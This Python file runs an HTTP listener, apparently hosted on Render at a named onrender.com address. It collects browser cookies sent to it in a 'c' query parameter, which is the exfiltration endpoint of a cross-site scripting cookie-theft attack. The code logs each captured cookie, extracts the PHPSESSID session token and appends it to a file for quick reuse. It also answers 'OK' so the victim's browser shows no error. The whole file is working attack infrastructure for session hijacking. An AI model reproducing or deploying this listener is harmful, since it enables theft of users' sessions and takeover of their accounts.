from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import os
from datetime import datetime
import sys

# Render asigna el puerto dinámico en la variable PORT
PORT = int(os.environ.get("PORT", 8000))

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Parseamos la URL y los parámetros
        parsed_path = urlparse(self.path)
        query = parse_qs(parsed_path.query)
        
        # Capturar el parámetro 'c' que contiene las cookies
        c_value = query.get('c', [''])[0]
        
        if c_value:
            # Mostrar en logs (Render verá esto)
            print(f"\n{'='*60}", file=sys.stderr, flush=True)
            print(f"[{datetime.now()}] COOKIE CAPTURADA!", file=sys.stderr, flush=True)
            print(f"URL completa: {self.path}", file=sys.stderr, flush=True)
            print(f"Contenido: {c_value}", file=sys.stderr, flush=True)
            
            # Extraer PHPSESSID específicamente
            if 'PHPSESSID' in c_value:
                # Buscar PHPSESSID=valor;
                start = c_value.find('PHPSESSID=') + 10  # 10 = len('PHPSESSID=')
                end = c_value.find(';', start)
                if end == -1:
                    end = len(c_value)
                phpsessid = c_value[start:end]
                
                print(f"[+] PHPSESSID extraída: {phpsessid}", file=sys.stderr, flush=True)
                
                # Guardar solo PHPSESSID en archivo (para uso rápido)
                try:
                    with open('phpsessid.txt', 'a') as f:
                        f.write(f"{datetime.now()} - {phpsessid}\n")
                except:
                    pass
            else:
                print("[-] No se encontró PHPSESSID", file=sys.stderr, flush=True)
        else:
            print(f"[?] Petición recibida sin parámetros: {self.path}", file=sys.stderr, flush=True)
        
        # Respuesta simple (evitar errores en navegador víctima)
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")
    
    def log_message(self, format, *args):
        # Silenciar logs de acceso HTTP normal, usamos stderr para debug
        pass

with HTTPServer(("", PORT), RequestHandler) as httpd:
    print(f"=== Servidor iniciado en puerto {PORT} ===", file=sys.stderr, flush=True)
    print(f"=== URL del servidor: https://listener-koyk.onrender.com ===", file=sys.stderr, flush=True)
    print(f"=== Endpoint para capturar cookies: https://listener-koyk.onrender.com/?c=COOKIES ===", file=sys.stderr, flush=True)
    print(f"=== Esperando cookies... ===", file=sys.stderr, flush=True)
    httpd.serve_forever()